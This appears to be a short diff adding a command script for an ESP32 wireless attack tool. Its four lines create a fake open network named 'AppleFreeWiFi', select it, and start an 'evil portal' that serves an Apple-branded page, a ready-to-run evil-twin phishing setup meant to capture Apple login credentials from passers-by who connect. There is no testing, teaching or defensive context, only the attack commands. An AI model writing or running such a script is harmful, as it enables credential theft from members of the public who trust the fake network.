@@ -1,0 +1,4 @@
+WEB_OFF
+ESP32M ssid -a -n AppleFreeWiFi
+ESP32M select -a 1
+ESP32M evilportal -c start -w apple.html
